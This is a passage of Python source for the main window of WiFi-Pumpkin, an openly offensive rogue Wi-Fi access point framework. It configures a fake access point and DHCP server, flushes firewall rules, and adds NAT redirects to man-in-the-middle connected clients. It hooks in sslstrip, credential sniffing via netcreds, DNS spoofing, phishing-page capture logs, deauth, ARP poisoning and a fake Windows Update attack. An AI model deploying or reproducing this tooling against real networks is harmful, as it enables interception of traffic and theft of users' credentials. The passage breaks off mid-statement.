from logging import getLogger,ERROR
getLogger('scapy.runtime').setLevel(ERROR)
try:
    from sys import exit
    from PyQt4.QtGui import *
    from PyQt4.QtCore import *
except ImportError:
    exit('WiFi-Pumpkin need PyQt4 :(')

from pwd import getpwnam
from grp import getgrnam
from time import asctime
from shutil import move
from re import search,sub

from os import (
    system,path,getcwd,
    popen,listdir,mkdir,chown,remove
)
from subprocess import (
    Popen,PIPE,STDOUT,call,check_output,
    CalledProcessError
)

from Core.Utils import (
    Refactor,set_monitor_mode
)
from Core.widgets.TabModels import (
    PumpkinProxy,PumpkinMonitor,
    PumpkinSettings
)

from Core.widgets.PopupModels import (
    PopUpPlugins,PopUpServer
)

from Core.utility.threads import  (
    ProcessHostapd,Thread_sergioProxy,
    ThRunDhcp,Thread_sslstrip,ProcessThread, ThreadFrontServer
)

from Proxy import *
import Modules as GUIModules
from isc_dhcp_leases.iscdhcpleases import IscDhcpLeases
from Core.widgets.docks.DockMonitor import dockAreaAPI
from Core.utility.settings import frm_Settings
from Core.utility.progressBarWid import ProgressBarWid

"""
Description:
    This program is a Core for wifi-pumpkin.py. file which includes functionality
    for mount Access point.

Copyright:
    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""


author      = 'Marcos Nesster (@mh4x0f)  P0cl4bs Team'
emails      = ['mh4root@gmail.com','p0cl4bs@gmail.com']
license     = ' GNU GPL 3'
version     = '0.7.5'
update      = '07/05/2016' # This is Brasil :D
desc        = ['Framework for Rogue Wi-Fi Access Point Attacks']

class Initialize(QMainWindow):
    ''' Main window settings multi-window opened'''
    def __init__(self, parent=None):
        super(Initialize, self).__init__(parent)
        self.FSettings      = frm_Settings()
        self.form_widget    = WifiPumpkin(self,self,self.FSettings)
        self.form_widget.setFixedHeight(540)
        self.form_widget.setFixedWidth(370)
        dock = QDockWidget()
        dock.setTitleBarWidget(QWidget())
        dock.setWidget(self.form_widget)
        dock.setSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred)
        dock.setFeatures(QDockWidget.NoDockWidgetFeatures)
        dock.setAllowedAreas(Qt.AllDockWidgetAreas)
        self.addDockWidget(Qt.LeftDockWidgetArea, dock)
        self.setWindowTitle('WiFi-Pumpkin v' + version)
        self.setGeometry(0, 0, 350, 450)
        self.loadtheme(self.FSettings.XmlThemeSelected())

    def loadtheme(self,theme):
        sshFile=("Core/%s.qss"%(theme))
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())

    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())

    def closeEvent(self, event):
        iwconfig = Popen(['iwconfig'], stdout=PIPE,shell=False,stderr=PIPE)
        for i in iwconfig.stdout.readlines():
            if search('Mode:Monitor',i):
                self.reply = QMessageBox.question(self,
                'About Exit','Are you sure to quit?', QMessageBox.Yes |
                QMessageBox.No, QMessageBox.No)
                if self.reply == QMessageBox.Yes:
                    set_monitor_mode(i.split()[0]).setDisable()
                    return event.accept()
        if self.form_widget.Apthreads['RougeAP'] != []:
            self.reply = QMessageBox.question(self,
            'About Access Point','Are you sure to stop all threads AP ?', QMessageBox.Yes |
            QMessageBox.No, QMessageBox.No)
            if self.reply == QMessageBox.Yes:
                print('killing all threads...')
                self.form_widget.kill()
                return event.accept()
        if hasattr(self,'reply'):
            event.ignore()

class WifiPumpkin(QWidget):
    ''' load main window class'''
    def __init__(self, parent = None,window=None,Fsettings=None):
        self.InitialMehtod = window
        super(WifiPumpkin, self).__init__(parent)
        #self.create_sys_tray()
        self.MainControl    = QVBoxLayout()
        self.TabControl     = QTabWidget()
        self.Tab_Default    = QWidget()
        self.Tab_Injector   = QWidget()
        self.Tab_Settings   = QWidget()
        self.Tab_ApMonitor  = QWidget()
        self.FSettings      = Fsettings
        #self.TabControl.setTabPosition(QTabWidget.w)
        self.TabControl.addTab(self.Tab_Default,'Home')

        self.ContentTabHome    = QVBoxLayout(self.Tab_Default)
        self.ContentTabInject  = QVBoxLayout(self.Tab_Injector)
        self.ContentTabsettings= QVBoxLayout(self.Tab_Settings)
        self.ContentTabMonitor = QVBoxLayout(self.Tab_ApMonitor)
        self.Apthreads      = {'RougeAP': []}
        self.APclients      = {}
        self.AreaDockInfo = {
            ':: URLMonitor::': {
                'active' : self.FSettings.Settings.get_setting('dockarea','dock_urlmonitor',format=bool),
                'path': 'Logs/AccessPoint/urls.log',
                'thread_name': 'Netcreds::Urls',
                'error': 'netcreds no logger found.'},

            '::Credentials:: ': {
                'active' : self.FSettings.Settings.get_setting('dockarea','dock_credencials',format=bool),
                'path': 'Logs/AccessPoint/credentials.log',
                'thread_name': 'Netcreds::Credentials',
                'error': 'netcreds no logger found.'},

            '::Pumpkin-Phishing:: ': {
                'active' : self.FSettings.Settings.get_setting('dockarea','dock_phishing',format=bool),
                'path': 'Logs/Phishing/Webclone.log',
                'thread_name': 'PumpKin-Phishing::Capture',
                'error': 'Phishing::capture no logger found'}
        }
        self.ConfigTwin     = {
        'ProgCheck':[],'AP_iface': None,
        'PortRedirect': None, 'interface':'None'}
        self.THeaders       = {'ip-address':[], 'device':[], 'mac-address':[]}
        self.PopUpPlugins   = PopUpPlugins(self.FSettings)
        self.checkPlugins()
        self.intGUI()

    def loadBanner(self):
        vbox = QVBoxLayout()
        vbox.setMargin(4)
        vbox.addStretch(2)
        self.FormBanner = QFormLayout()
        self.FormBanner.addRow(vbox)
        self.logo = QPixmap(getcwd() + '/Icons/logo.png')
        self.imagem = QLabel(self)
        self.imagem.setPixmap(self.logo)
        self.FormBanner.addRow(self.imagem)

    def InjectorTABContent(self):
        self.ProxyPluginsTAB = PumpkinProxy(self.PopUpPlugins,self.FSettings)
        self.ProxyPluginsTAB.sendError.connect(self.GetErrorInjector)
        self.ContentTabInject.addLayout(self.ProxyPluginsTAB)

    def getContentTabDock(self,docklist):
        self.dockAreaList = docklist

    def GetErrorInjector(self,data):
        QMessageBox.warning(self,'Error Module::Proxy',data)
    def GetmessageSave(self,data):
        QMessageBox.information(self,'Settings DHCP',data)

    def ApMonitorTabContent(self):
        self.PumpMonitorTAB = PumpkinMonitor(self.FSettings)
        self.ContentTabMonitor.addLayout(self.PumpMonitorTAB)

    def SettingsTABContent(self):
        self.PumpSettingsTAB = PumpkinSettings(None,self.AreaDockInfo,self.InitialMehtod,self.FSettings)
        self.PumpSettingsTAB.checkDockArea.connect(self.getContentTabDock)
        self.PumpSettingsTAB.sendMensage.connect(self.GetmessageSave)
        self.ContentTabsettings.addLayout(self.PumpSettingsTAB)

    def DefaultTABContent(self):
        self.StatusBar = QStatusBar()
        self.StatusBar.setFixedHeight(15)
        self.StatusBar.addWidget(QLabel("::Access|Point::"))
        self.StatusDhcp = QLabel("")
        self.connectedCount = QLabel('')
        self.StatusDhcp = QLabel('')
        self.StatusBar.addWidget(self.StatusDhcp)
        self.Started(False)
        self.StatusBar.addWidget(QLabel(''),20)
        self.StatusBar.addWidget(QLabel("::Clients::"))
        self.connectedCount.setText("0")
        self.connectedCount.setStyleSheet("QLabel {  color : yellow; }")
        self.StatusBar.addWidget(self.connectedCount)
        self.EditGateway = QLineEdit(self)
        self.EditApName = QLineEdit(self)
        self.EditChannel = QLineEdit(self)
        self.selectCard = QComboBox(self)

        # table information AP connected
        self.TabInfoAP = QTableWidget(5,3)
        self.TabInfoAP.setRowCount(50)
        self.TabInfoAP.setFixedHeight(180)
        self.TabInfoAP.resizeRowsToContents()
        self.TabInfoAP.setSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred)
        self.TabInfoAP.horizontalHeader().setStretchLastSection(True)
        self.TabInfoAP.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.TabInfoAP.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.TabInfoAP.verticalHeader().setVisible(False)
        self.TabInfoAP.setHorizontalHeaderLabels(self.THeaders.keys())
        self.TabInfoAP.verticalHeader().setDefaultSectionSize(23)
        #edits
        self.mConfigure()
        self.FormGroup2 = QFormLayout()
        self.FormGroup3 = QFormLayout()

        #popup settings
        self.btnPlugins = QToolButton(self)
        self.btnPlugins.setFixedHeight(25)
        self.btnPlugins.setIcon(QIcon('Icons/plugins.png'))
        self.btnPlugins.setText('[::Plugins::]')
        self.btnPlugins.setPopupMode(QToolButton.MenuButtonPopup)
        self.btnPlugins.setMenu(QMenu(self.btnPlugins))
        action = QWidgetAction(self.btnPlugins)
        action.setDefaultWidget(self.PopUpPlugins)
        self.btnPlugins.menu().addAction(action)

        self.btnHttpServer = QToolButton(self)
        self.btnHttpServer.setFixedHeight(25)
        self.btnHttpServer.setIcon(QIcon('Icons/phishing.png'))
        self.FormPopup = PopUpServer(self.FSettings)
        self.btnHttpServer.setPopupMode(QToolButton.MenuButtonPopup)
        self.btnHttpServer.setMenu(QMenu(self.btnHttpServer))
        action = QWidgetAction(self.btnHttpServer)
        action.setDefaultWidget(self.FormPopup)
        self.btnHttpServer.menu().addAction(action)

        self.GroupAP = QGroupBox()
        self.GroupAP.setTitle('Access Point::')
        self.FormGroup3.addRow('Gateway:', self.EditGateway)
        self.FormGroup3.addRow('AP Name:', self.EditApName)
        self.FormGroup3.addRow('Channel:', self.EditChannel)
        self.GroupAP.setLayout(self.FormGroup3)

        # grid network adapter fix
        self.btrn_refresh = QPushButton('Refresh')
        self.btrn_refresh.setIcon(QIcon('Icons/refresh.png'))
        self.btrn_refresh.clicked.connect(self.refrash_interface)

        self.layout = QFormLayout()
        self.GroupAdapter = QGroupBox()
        self.GroupAdapter.setFixedHeight(120)
        self.GroupAdapter.setFixedWidth(120)
        self.GroupAdapter.setTitle('Network Adapter::')
        self.layout.addRow(self.selectCard)
        self.layout.addRow(self.btrn_refresh)
        self.layout.addRow(self.btnPlugins,self.btnHttpServer)
        self.GroupAdapter.setLayout(self.layout)

        self.btn_start_attack = QPushButton('Start Access Point', self)
        self.btn_start_attack.setIcon(QIcon('Icons/start.png'))
        self.btn_cancelar = QPushButton('Stop Access Point', self)
        self.btn_cancelar.setIcon(QIcon('Icons/Stop.png'))
        self.btn_cancelar.clicked.connect(self.kill)
        self.btn_start_attack.clicked.connect(self.StartApFake)

        hBox = QHBoxLayout()
        hBox.addWidget(self.btn_start_attack)
        hBox.addWidget(self.btn_cancelar)

        self.slipt = QHBoxLayout()
        self.slipt.addWidget(self.GroupAP)
        self.slipt.addWidget(self.GroupAdapter)

        self.progress = ProgressBarWid(total=101)
        self.progress.setFixedHeight(20)
        self.FormGroup2.addRow(self.progress)
        self.FormGroup2.addRow(hBox)
        self.FormGroup2.addRow(self.TabInfoAP)
        self.FormGroup2.addRow(self.StatusBar)
        self.ContentTabHome.addLayout(self.slipt)
        self.ContentTabHome.addLayout(self.FormGroup2)

    def intGUI(self):
        self.loadBanner()
        self.DefaultTABContent()
        self.InjectorTABContent()
        self.SettingsTABContent()
        self.ApMonitorTabContent()

        self.myQMenuBar = QMenuBar(self)
        self.myQMenuBar.setFixedWidth(400)

        Menu_View = self.myQMenuBar.addMenu('&View')
        phishinglog = QAction('Monitor Phishing', self)
        netcredslog = QAction('Monitor NetCreds', self)
        dns2proxylog = QAction('Monitor Dns2proxy', self)
        #connect
        phishinglog.triggered.connect(self.credentials)
        netcredslog.triggered.connect(self.logsnetcreds)
        dns2proxylog.triggered.connect(self.logdns2proxy)
        #icons
        phishinglog.setIcon(QIcon('Icons/password.png'))
        netcredslog.setIcon(QIcon('Icons/logger.png'))
        dns2proxylog.setIcon(QIcon('Icons/proxy.png'))
        Menu_View.addAction(phishinglog)
        Menu_View.addAction(netcredslog)
        Menu_View.addAction(dns2proxylog)

        #menu module
        Menu_module = self.myQMenuBar.addMenu('&Modules')
        btn_deauth = QAction('Deauth Attack', self)
        btn_probe = QAction('Probe Request',self)
        btn_mac = QAction('Mac Changer', self)
        btn_dhcpStar = QAction('DHCP S. Attack',self)
        btn_winup = QAction('Windows Update',self)
        btn_arp = QAction('Arp Posion Attack',self)
        btn_dns = QAction('Dns Spoof Attack',self)
        btn_phishing = QAction('Phishing Manager',self)
        action_settings = QAction('Settings',self)

        #connect buttons
        btn_probe.triggered.connect(self.showProbe)
        btn_deauth.triggered.connect(self.formDauth)
        btn_mac.triggered.connect(self.form_mac)
        btn_dhcpStar.triggered.connect(self.show_dhcpDOS)
        btn_winup.triggered.connect(self.show_windows_update)
        btn_arp.triggered.connect(self.show_arp_posion)
        btn_dns.triggered.connect(self.show_dns_spoof)
        btn_phishing.triggered.connect(self.show_PhishingManager)
        action_settings.triggered.connect(self.show_settings)

        #icons Modules
        btn_arp.setIcon(QIcon('Icons/arp_.png'))
        btn_winup.setIcon(QIcon('Icons/arp.png'))
        btn_dhcpStar.setIcon(QIcon('Icons/dhcp.png'))
        btn_mac.setIcon(QIcon('Icons/mac.png'))
        btn_probe.setIcon(QIcon('Icons/probe.png'))
        btn_deauth.setIcon(QIcon('Icons/deauth.png'))
        btn_dns.setIcon(QIcon('Icons/dns_spoof.png'))
        btn_phishing.setIcon(QIcon('Icons/page.png'))
        action_settings.setIcon(QIcon('Icons/setting.png'))

        # add modules menu
        Menu_module.addAction(btn_deauth)
        Menu_module.addAction(btn_probe)
        Menu_module.addAction(btn_mac)
        Menu_module.addAction(btn_dhcpStar)
        Menu_module.addAction(btn_winup)
        Menu_module.addAction(btn_arp)
        Menu_module.addAction(btn_dns)
        Menu_module.addAction(btn_phishing)
        Menu_module.addAction(action_settings)

        #menu extra


        self.MainControl.addLayout(self.FormBanner)
        self.MainControl.addWidget(self.TabControl)
        self.setLayout(self.MainControl)

    def show_arp_posion(self):
        self.Farp_posion = GUIModules.frm_Arp_Poison()
        self.Farp_posion.setGeometry(0, 0, 450, 300)
        self.Farp_posion.show()

    def show_settings(self):
        self.FSettings.show()

    def show_windows_update(self):
        self.FWinUpdate = GUIModules.frm_update_attack()
        self.FWinUpdate.setGeometry(QRect(100, 100, 450, 300))
        self.FWinUpdate.show()

    def show_dhcpDOS(self):
        self.Fstar = GUIModules.frm_dhcp_Attack()
        self.Fstar.setGeometry(QRect(100, 100, 450, 200))
        self.Fstar.show()

    def showProbe(self):
        self.Fprobe = GUIModules.frm_PMonitor()
        self.Fprobe.setGeometry(QRect(100, 100, 400, 400))
        self.Fprobe.show()

    def formDauth(self):
        self.Fdeauth =GUIModules.frm_deauth()
        self.Fdeauth.setGeometry(QRect(100, 100, 200, 200))
        self.Fdeauth.show()

    def form_mac(self):
        self.Fmac = GUIModules.frm_mac_generator()
        self.Fmac.setGeometry(QRect(100, 100, 300, 100))
        self.Fmac.show()

    def show_dns_spoof(self):
        self.Fdns = GUIModules.frm_DnsSpoof()
        self.Fdns.setGeometry(QRect(100, 100, 450, 300))
        self.Fdns.show()

    def show_PhishingManager(self):
        self.FPhishingManager = self.FormPopup.Ftemplates
        self.FPhishingManager.txt_redirect.setText('0.0.0.0')
        self.FPhishingManager.show()

    def credentials(self):
        self.Fcredentials = GUIModules.frm_get_credentials()
        self.Fcredentials.setWindowTitle('Phishing Logger')
        self.Fcredentials.show()

    def logsnetcreds(self):
        self.FnetCreds = GUIModules.frm_NetCredsLogger()
        self.FnetCreds.setWindowTitle('NetCreds Logger')
        self.FnetCreds.show()

    def logdns2proxy(self):
        self.Fdns2proxy = GUIModules.frm_dns2proxy()
        self.Fdns2proxy.setWindowTitle('Dns2proxy Logger')
        self.Fdns2proxy.show()

    def checkPlugins(self):
        if self.FSettings.Settings.get_setting('plugins','sslstrip_plugin',format=bool):
            self.PopUpPlugins.check_sslstrip.setChecked(True)
            self.PopUpPlugins.set_sslStripRule()
        if self.FSettings.Settings.get_setting('plugins','netcreds_plugin',format=bool):
            self.PopUpPlugins.check_netcreds.setChecked(True)
        if self.FSettings.Settings.get_setting('plugins','dns2proxy_plugin',format=bool):
            self.PopUpPlugins.check_dns2proy.setChecked(True)
            self.PopUpPlugins.set_Dns2proxyRule()
        if self.FSettings.Settings.get_setting('plugins','sergioproxy_plugin',format=bool):
            self.PopUpPlugins.check_sergioProxy.setChecked(True)
            if not self.FSettings.Settings.get_setting('plugins','sslstrip_plugin',format=bool):
                self.PopUpPlugins.set_sslStripRule()

    def Started(self,bool):
        if bool:
            self.StatusDhcp.setText("[ON]")
            self.StatusDhcp.setStyleSheet("QLabel {  color : green; }")
        else:
            self.StatusDhcp.setText("[OFF]")
            self.StatusDhcp.setStyleSheet("QLabel {  color : red; }")

    def StatusDHCPRequests(self,mac,user_info):
        return self.PumpMonitorTAB.addRequests(mac,user_info,True)

    def GetDHCPRequests(self,data):
        if len(data) == 8:
            if Refactor.check_is_mac(data[4]):
                if data[4] not in self.APclients.keys():
                    self.APclients[data[4]] = {'IP': data[2],
                    'device': sub(r'[)|(]',r'',data[5]),'in_tables': False,}
                    self.StatusDHCPRequests(data[4],self.APclients[data[4]])
        elif len(data) == 9:
            if Refactor.check_is_mac(data[5]):
                if data[5] not in self.APclients.keys():
                    self.APclients[data[5]] = {'IP': data[2],
                    'device': sub(r'[)|(]',r'',data[6]),'in_tables': False,}
                    self.StatusDHCPRequests(data[5],self.APclients[data[5]])
        elif len(data) == 7:
            if Refactor.check_is_mac(data[4]):
                if data[4] not in self.APclients.keys():
                    leases = IscDhcpLeases('/var/lib/dhcp/dhcpd.leases')
                    hostname = None
                    try:
                        for item in leases.get():
                            if item.ethernet == data[4]:
                                hostname = item.hostname
                        if hostname == None:
                            item = leases.get_current()
                            hostname = item[data[4]]
                    except:
                        hostname = 'unknown'
                    if hostname == None:hostname = 'unknown'
                    self.APclients[data[4]] = {'IP': data[2],'device': hostname,
                    'in_tables': False,}
                    self.StatusDHCPRequests(data[4],self.APclients[data[4]])

        Headers = []
        for mac in self.APclients.keys():
            if self.APclients[mac]['in_tables'] == False:
                self.APclients[mac]['in_tables'] = True
                self.THeaders['mac-address'].append(mac)
                self.THeaders['ip-address'].append(self.APclients[mac]['IP'])
                self.THeaders['device'].append(self.APclients[mac]['device'])
                for n, key in enumerate(self.THeaders.keys()):
                    Headers.append(key)
                    for m, item in enumerate(self.THeaders[key]):
                        item = QTableWidgetItem(item)
                        item.setTextAlignment(Qt.AlignVCenter | Qt.AlignCenter)
                        self.TabInfoAP.setItem(m, n, item)
                self.TabInfoAP.setHorizontalHeaderLabels(self.THeaders.keys())
        self.connectedCount.setText(str(len(self.APclients.keys())))


    def GetHostapdStatus(self,data):
        if self.APclients != {}:
            if data in self.APclients.keys():
                self.PumpMonitorTAB.addRequests(data,self.APclients[data],False)
        for row in xrange(0,self.TabInfoAP.rowCount()):
            if self.TabInfoAP.item(row,1) != None:
                if self.TabInfoAP.item(row,1).text() == data:
                    self.TabInfoAP.removeRow(row)
                    if data in self.APclients.keys():
                        del self.APclients[data]
        for mac_tables in self.APclients.keys():self.APclients[mac_tables]['in_tables'] = False
        self.THeaders = {'ip-address':[], 'device':[], 'mac-address':[]}
        self.connectedCount.setText(str(len(self.APclients.keys())))

    def mConfigure(self):
        self.get_interfaces = Refactor.get_interfaces()
        try:
            self.EditGateway.setText(
            [self.get_interfaces[x] for x in self.get_interfaces.keys() if x == 'gateway'][0])
        except:pass
        self.EditApName.setText(self.FSettings.Settings.get_setting('accesspoint','APname'))
        self.EditChannel.setText(self.FSettings.Settings.get_setting('accesspoint','channel'))
        self.ConfigTwin['PortRedirect'] = self.FSettings.redirectport.text()
        for i,j in enumerate(self.get_interfaces['all']):
            if search('wlan1', j):self.selectCard.addItem(self.get_interfaces['all'][i])
        driftnet = popen('which driftnet').read().split('\n')
        ettercap = popen('which ettercap').read().split('\n')
        dhcpd = popen('which dhcpd').read().split("\n")
        dnsmasq = popen('which dnsmasq').read().split("\n")
        hostapd = popen('which hostapd').read().split("\n")
        lista = [ '/usr/sbin/airbase-ng', ettercap[0],driftnet[0],dhcpd[0],dnsmasq[0],hostapd[0]]
        for i in lista:self.ConfigTwin['ProgCheck'].append(path.isfile(i))

    def refrash_interface(self):
        self.selectCard.clear()
        n = Refactor.get_interfaces()['all']
        for i,j in enumerate(n):
            if search('wl', j):
                self.selectCard.addItem(n[i])

    def kill(self):
        if self.Apthreads['RougeAP'] == []: return
        self.ProxyPluginsTAB.GroupSettings.setEnabled(True)
        self.FSettings.Settings.set_setting('accesspoint','statusAP',False)
        if hasattr(self,'dockAreaList'):
            for dock in self.dockAreaList.keys():
                self.dockAreaList[dock].clear()
                self.dockAreaList[dock].stopProcess()
        self.PumpSettingsTAB.GroupArea.setEnabled(True)
        for thread in self.Apthreads['RougeAP']: thread.stop()
        for kill in self.SettingsAP['kill']:
            Popen(kill.split(), stdout=PIPE,shell=False,stderr=PIPE)
        Refactor.settingsNetworkManager(self.ConfigTwin['AP_iface'],Remove=True)
        set_monitor_mode(self.ConfigTwin['AP_iface']).setDisable()
        self.Started(False)
        self.progress.setValue(1)
        self.progress.change_color('')
        self.Apthreads['RougeAP'] = []
        self.APclients = {}
        lines = []
        if self.ProxyPluginsTAB.log_inject.count()>0:
            with open('Logs/AccessPoint/injectionPage.log','w') as injectionlog:
                for index in xrange(self.ProxyPluginsTAB.log_inject.count()):
                    lines.append(str(self.ProxyPluginsTAB.log_inject.item(index).text()))
                for log in lines: injectionlog.write(log+'\n')
                injectionlog.close()
        with open('/var/lib/dhcp/dhcpd.leases','w') as dhcpLease:
            dhcpLease.write(''),dhcpLease.close()
        self.btn_start_attack.setDisabled(False)
        popen('ulimit -n 1024')
        Refactor.set_ip_forward(0)
        self.TabInfoAP.clearContents()
        if hasattr(self.FormPopup,'Ftemplates'):
            self.FormPopup.Ftemplates.killThread()
            self.FormPopup.StatusServer(False)

    def CoreSettings(self):
        self.DHCP = self.PumpSettingsTAB.getPumpkinSettings()
        self.ConfigTwin['PortRedirect'] = self.FSettings.Settings.get_setting('settings','redirect_port')
        self.SettingsAP = {
        'interface':
            [
                'ifconfig %s up'%(self.ConfigTwin['AP_iface']),
                'ifconfig %s %s netmask %s'%(self.ConfigTwin['AP_iface'],self.DHCP['router'],self.DHCP['netmask']),
                'ifconfig %s mtu 1400'%(self.ConfigTwin['AP_iface']),
                'route add -net %s netmask %s gw %s'%(self.DHCP['subnet'],
                self.DHCP['netmask'],self.DHCP['router'])
            ],
        'kill':
            [
                'iptables --flush',
                'iptables --table nat --flush',
                'iptables --delete-chain',
                'iptables --table nat --delete-chain',
                'ifconfig %s 0'%(self.ConfigTwin['AP_iface']),
                'killall dhpcd',
                'killall dnsmasq'
            ],
        'hostapd':
            [
                'interface={}\n'.format(str(self.selectCard.currentText())),
                'ssid={}\n'.format(str(self.EditApName.text())),
                'channel={}\n'.format(str(self.EditChannel.text())),
            ],
        'dhcp-server':
            [
                'authoritative;\n',
                'default-lease-time {};\n'.format(self.DHCP['leasetimeDef']),
                'max-lease-time {};\n'.format(self.DHCP['leasetimeMax']),
                'subnet %s netmask %s {\n'%(self.DHCP['subnet'],self.DHCP['netmask']),
                'option routers {};\n'.format(self.DHCP['router']),
                'option subnet-mask {};\n'.format(self.DHCP['netmask']),
                'option broadcast-address {};\n'.format(self.DHCP['broadcast']),
                'option domain-name \"%s\";\n'%(str(self.EditApName.text())),
                'option domain-name-servers {};\n'.format(self.DHCP['router']),
                'range {};\n'.format(self.DHCP['range'].replace('/',' ')),
                '}',
            ],
        'dnsmasq':
            [
                'interface=%s\n'%(self.ConfigTwin['AP_iface']),
                'dhcp-range=10.0.0.1,10.0.0.50,12h\n',
                'dhcp-option=3, 10.0.0.1\n',
                'dhcp-option=6, 10.0.0.1\n',
            ]
        }
        Refactor.set_ip_forward(1)
        for i in self.SettingsAP['kill']: Popen(i.split(), stdout=PIPE,shell=False,stderr=PIPE)
        for i in self.SettingsAP['interface']: Popen(i.split(), stdout=PIPE,shell=False,stderr=PIPE)
        dhcp_select = self.FSettings.Settings.get_setting('accesspoint','dhcp_server')
        if dhcp_select != 'dnsmasq':
            with open('Settings/dhcpd.conf','w') as dhcp:
                for i in self.SettingsAP['dhcp-server']:dhcp.write(i)
                dhcp.close()
                if path.isfile('/etc/dhcp/dhcpd.conf'):
                    system('rm /etc/dhcp/dhcpd.conf')
                if not path.isdir('/etc/dhcp/'):mkdir('/etc/dhcp')
                move('Settings/dhcpd.conf', '/etc/dhcp/')
        else:
            with open('Core/config/dnsmasq.conf','w') as dhcp:
                for i in self.SettingsAP['dnsmasq']:
                    dhcp.write(i)
                dhcp.close()

    def SoftDependencies(self):
        if not self.ConfigTwin['ProgCheck'][5]:
            return QMessageBox.information(self,'Error Hostapd','hostapd is not installed')
        dhcp_select = self.FSettings.Settings.get_setting('accesspoint','dhcp_server')
        if dhcp_select == 'iscdhcpserver':
            if not self.ConfigTwin['ProgCheck'][3]:
                return QMessageBox.warning(self,'Error dhcp','isc-dhcp-server is not installed')
        return True

    def StartApFake(self):
        if len(self.selectCard.currentText()) == 0:
            return QMessageBox.warning(self,'Error interface ','Network interface is not found')
        if not type(self.SoftDependencies()) is bool: return

        self.interfacesLink = Refactor.get_interfaces()
        if len(self.EditGateway.text()) == 0 or self.interfacesLink['activated'] == None:
            return QMessageBox.warning(self,'Internet Connection','No internet connection not found, '
            'sorry WiFi-Pumpkin tool requires an internet connection to mount MITM attack. '
            'check your connection and try again')

        if str(self.selectCard.currentText()) == self.interfacesLink['activated']:
            iwconfig = Popen(['iwconfig'], stdout=PIPE,shell=False,stderr=PIPE)
            for line in iwconfig.stdout.readlines():
                if str(self.selectCard.currentText()) in line:
                    return QMessageBox.warning(self,'Wireless Interface',
                    'An connection with {} has been detected '
                    ' : Device or resource busy\n{}'.format(
                    str(self.selectCard.currentText()),line))

        import platform
        if platform.dist()[0] == 'Kali':
            if str(self.interfacesLink['activated']).startswith('wl'):
                return QMessageBox.information(self,'Error network card',
                    'You are connected with interface wireless, try again with local connection')

        dh, gateway = self.PumpSettingsTAB.getPumpkinSettings()['router'],str(self.EditGateway.text())
        if dh[:len(dh)-len(dh.split('.').pop())] == gateway[:len(gateway)-len(gateway.split('.').pop())]:
            return QMessageBox.warning(self,'DHCP Server Settings',
                'The DHCP server check if range ip class is same.'
                'it works, but not share internet connection in some case.\n'
                'for fix this, You need change on tab (Pumpkin-Settings -> Class Ranges)'
                'now you have choose the Class range different of your network.')
        self.btn_start_attack.setDisabled(True)
        popen('ulimit -n 64000')

        self.APactived = self.FSettings.Settings.get_setting('accesspoint','using')
        if self.APactived == 'hostapd':
            self.ConfigTwin['AP_iface'] = str(self.selectCard.currentText())
            if str(self.interfacesLink['activated']).startswith('eth') or \
               str(self.interfacesLink['activated']).startswith('enp'):
                try:
                    check_output(['nmcli','radio','wifi',"off"])
                except Exception:
                    try:
                        check_output(['nmcli','nm','wifi',"off"])
                    except Exception as e:
                        return QMessageBox.warning(self,'Error nmcli',e)
                finally:
                    call(['rfkill', 'unblock' ,'wifi'])
            elif str(self.interfacesLink['activated']).startswith('wl'):
                if not Refactor.settingsNetworkManager(self.ConfigTwin['AP_iface'],Remove=False):
                    return QMessageBox.warning(self,'Network Manager',
                    'Not found file NetworkManager.conf in folder /etc/NetworkManager/')

            leases = '/var/lib/dhcp/dhcpd.leases'
            if not path.exists(leases[:-12]):
                mkdir(leases[:-12])
            if not path.isfile(leases):
                with open(leases,'wb') as leaconf:
                    leaconf.close()
            uid = getpwnam('root').pw_uid
            gid = getgrnam('root').gr_gid
            chown(leases, uid, gid)
            self.CoreSettings()
            ignore = ('interface=','ssid=','channel=')
            with open('Settings/hostapd.conf','w') as apconf:
                for i in self.SettingsAP['hostapd']:apconf.write(i)
                for config in str(self.FSettings.ListHostapd.toPlainText()).split('\n'):
                    if not config.startswith('#') and len(config) > 0:
                        if not config.startswith(ignore):
                            apconf.write(config+'\n')
                apconf.close()
            self.Thread_hostapd = ProcessHostapd(['hostapd','-d','Settings/hostapd.conf'])
            self.Thread_hostapd.setObjectName('hostapd')
            self.Thread_hostapd.statusAP_connected.connect(self.GetHostapdStatus)
            self.Apthreads['RougeAP'].append(self.Thread_hostapd)

        # thread dhcp
        popen('ifconfig {} up'.format(str(self.selectCard.currentText())))
        selected_dhcp = self.FSettings.Settings.get_setting('accesspoint','dhcp_server')
        if selected_dhcp == 'iscdhcpserver':
            Thread_dhcp = ThRunDhcp(['sudo','dhcpd','-d','-f','-lf','/var/lib/dhcp/dhcpd.leases','-cf',
            '/etc/dhcp/dhcpd.conf',self.ConfigTwin['AP_iface']])
            Thread_dhcp.sendRequest.connect(self.GetDHCPRequests)
            Thread_dhcp.setObjectName('DHCP')
            self.Apthreads['RougeAP'].append(Thread_dhcp)

        self.Started(True)
        self.ProxyPluginsTAB.GroupSettings.setEnabled(False)
        self.FSettings.Settings.set_setting('accesspoint','statusAP',True)
        self.FSettings.Settings.set_setting('accesspoint','interfaceAP',str(self.selectCard.currentText()))


        if self.PopUpPlugins.check_sslstrip.isChecked() or not self.PopUpPlugins.check_dns2proy.isChecked():
            popen('iptables -t nat -A PREROUTING -p udp -j DNAT --to {}'.format(str(self.EditGateway.text())))
        # load ProxyPLugins
        self.plugin_classes = Plugin.PluginProxy.__subclasses__()
        self.plugins = {}
        for p in self.plugin_classes:
            self.plugins[p._name] = p()

        # thread plugins
        if self.PopUpPlugins.check_sslstrip.isChecked() and not self.PopUpPlugins.check_sergioProxy.isChecked():
            self.Threadsslstrip = Thread_sslstrip(self.ConfigTwin['PortRedirect'],
